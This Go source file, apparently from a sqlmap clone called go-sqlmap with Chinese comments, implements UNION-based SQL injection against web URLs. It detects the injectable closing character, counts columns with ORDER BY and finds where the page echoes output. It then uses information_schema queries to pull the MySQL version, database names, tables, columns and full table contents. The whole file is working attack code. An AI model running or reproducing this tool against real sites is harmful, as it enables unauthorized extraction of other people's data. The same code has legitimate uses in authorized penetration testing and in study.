package core

import (
	"bytes"
	"go-sqlmap/constant"
	"go-sqlmap/log"
	"go-sqlmap/util"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"
)

// DetectUnionSelectSqlInject 检测是否存在Union Select注入
func DetectUnionSelectSqlInject(url string, method string) (bool, string) {
	for _, v := range constant.SuffixList {
		innerUrl := url + v
		code, _, body := util.Request(method, innerUrl, nil, nil)
		if code != -1 {
			if strings.Contains(strings.ToLower(string(body)),
				strings.ToLower(constant.DetectedKeyword)) {
				log.Info("detected union select sql injection!")
				return true, innerUrl
			}
		}
	}
	log.Info("not detected union select sql injection!")
	os.Exit(-1)
	return false, ""
}

// GetSuffix 获取可能的闭合符号列表
func GetSuffix(target string) (bool, []string) {
	_, _, defaultBody := util.Request(constant.DefaultMethod, target, nil, nil)
	var suffixList []string
	for _, v := range constant.SuffixList {
		condition := target + v + constant.UnionSelectSuffixCondition
		_, _, conditionBody := util.Request(constant.DefaultMethod, condition, nil, nil)
		payload := target + v + constant.UnionSelectSuffixPayload
		_, _, payloadBody := util.Request(constant.DefaultMethod, payload, nil, nil)
		// 双重验证只能尽量保证闭合符号正确，还需要OrderBy中验证
		if string(defaultBody) == string(payloadBody) &&
			string(defaultBody) == string(conditionBody) {
			suffixList = append(suffixList, v)
		}
	}
	if len(suffixList) > 0 {
		return true, suffixList
	}
	return false, suffixList
}

// GetOrderByNum 用Order By语句检测出真正的闭合符号并得到列数
func GetOrderByNum(suffixList []string, url string) (string, int) {
	for i := 1; ; i++ {
		for _, suffix := range suffixList {
			// 一般表的字段数不可能超过100个
			if i > 100 {
				return "", 0
			}
			payload := url + suffix + constant.Space + constant.UnionSelectOrderPayload +
				constant.Space + strconv.Itoa(i) + constant.Space + constant.Annotator
			code, _, body := util.Request(constant.DefaultMethod, payload, nil, nil)
			if code != -1 {
				// 得到最终正确的闭合符号
				if strings.Contains(strings.ToLower(string(body)),
					strings.ToLower(constant.OrderKeyword)) {
					return suffix, i
				}
			}
		}
	}
}

// GetUnionSelectPos 根据得到的列数得到页面回显索引
func GetUnionSelectPos(suffix string, url string, key int) Pos {
	url = url + constant.UnionSelectUnionCondition
	unionSql := bytes.Buffer{}
	unionSql.WriteString(url + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	rand.Seed(time.Now().UnixNano())
	randMap := make(map[int]int)
	for i := 1; i < key; i++ {
		x := rand.Intn(constant.DefaultRandomRange)
		randMap[i] = x
		unionSql.WriteString(strconv.Itoa(x) + ",")
	}
	res := util.DeleteLastChar(unionSql.String())
	unionPayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, unionPayload, nil, nil)
	pos := Pos{}
	var tempPosList []Pos
	if code != -1 {
		body := string(tempBody)
		for k, v := range randMap {
			if !strings.Contains(body, strconv.Itoa(v)) {
				continue
			}
			index := strings.Index(body, strconv.Itoa(v))
			if index != -1 {
				tempPos := Pos{}
				tempPos.Key = k
				tempPos.StartIndex = index
				endIndex := index + len(strconv.Itoa(v))
				tempPos.EndIndexChar = util.GetIndexChar(body, endIndex)
				tempPosList = append(tempPosList, tempPos)
			}
		}
		min := GetMinPos(tempPosList)
		return min
	}
	return pos
}

// GetVersion 根据已有的条件得到数据库版本信息
func GetVersion(pos Pos, suffix string, url string, key int) string {
	url = url + constant.UnionSelectUnionCondition
	versionSql := bytes.Buffer{}
	versionSql.WriteString(url + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		versionSql.WriteString(constant.VersionFunc + ",")
	}
	res := util.DeleteLastChar(versionSql.String())
	versionPayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, versionPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("MySQL Version:" + result)
		return result
	}
	return ""
}

// GetCurrentDatabase 根据已有的条件得到当前数据库名
func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
	url = url + constant.UnionSelectUnionCondition
	databaseSql := bytes.Buffer{}
	databaseSql.WriteString(url + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		databaseSql.WriteString(constant.DatabaseFunc + ",")
	}
	res := util.DeleteLastChar(databaseSql.String())
	databasePayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, databasePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("current database:" + result)
		return result
	}
	return ""
}

// GetAllDatabases 根据已有的信息得到所有的数据库名
func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
	url = url + constant.UnionSelectUnionCondition
	database := constant.UnionSelectUnionSql
	databaseSql := bytes.Buffer{}
	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
	for i := 1; i < key; i++ {
		databaseSql.WriteString("group_concat(schema_name),")
	}
	res := util.DeleteLastChar(databaseSql.String())
	fromSql := "from%20information_schema.schemata%20"
	tablePayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("get databases success")
		util.PrintDatabases(util.ConvertString(result))
		return result
	}
	return ""
}

// GetAllTables 根据已有的信息得到某数据库中所有的表
func GetAllTables(pos Pos, suffix string, url string, key int, database string) string {
	url = url + constant.UnionSelectUnionCondition
	tableSql := bytes.Buffer{}
	tableSql.WriteString(url + suffix + constant.Space + constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		tableSql.WriteString("group_concat(table_name),")
	}
	res := util.DeleteLastChar(tableSql.String())
	fromSql := "from%20information_schema.tables%20where%20table_schema='" + database + "'%20"
	tablePayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("get tables success")
		util.PrintTables(util.ConvertString(result))
		return result
	}
	return ""
}

// GetColumns 根据已有的信息得到某表中的所有字段名
func GetColumns(pos Pos, suffix string, url string, key int, database string, tableName string) string {
	url = url + constant.UnionSelectUnionCondition
	columnSql := bytes.Buffer{}
	columnSql.WriteString(url + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		columnSql.WriteString("group_concat(column_name),")
	}
	res := util.DeleteLastChar(columnSql.String())
	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
		"'%20and%20table_schema='" + database + "'%20"
	columnPayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("get columns success")
		util.PrintColumns(util.ConvertString(result))
		return result
	}
	return ""
}

// GetData 根据已有的信息得到某表所有数据
func GetData(pos Pos, suffix string, url string, key int, database string, tableName string, columns []string) {
	url = url + constant.UnionSelectUnionCondition
	dataSql := bytes.Buffer{}
	dataSql.WriteString(url + suffix + constant.Space +
		constant.UnionSelectUnionSql + constant.Space)
	for i := 1; i < key; i++ {
		prefix := "group_concat("
		for _, v := range columns {
			prefix = prefix + v + ",0x3a,"
		}
		innerR := []rune(prefix)
		innerRes := string(innerR[:len(innerR)-6])
		dataSql.WriteString(innerRes + "),")
	}
	res := util.DeleteLastChar(dataSql.String())
	fromSql := "from%20" + database + "." + tableName
	columnPayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerRes := util.SubstringFrom(body, pos.StartIndex)
		result := strings.Split(innerRes, pos.EndIndexChar)[0]
		log.Info("get data success")
		var output [][]string
		for _, v := range strings.Split(result, ",") {
			var temp []string
			params := strings.Split(v, ":")
			for _, innerV := range params {
				temp = append(temp, innerV)
			}
			output = append(output, temp)
		}
		util.PrintData(util.ConvertInterfaceArray(columns, output))
	}
}
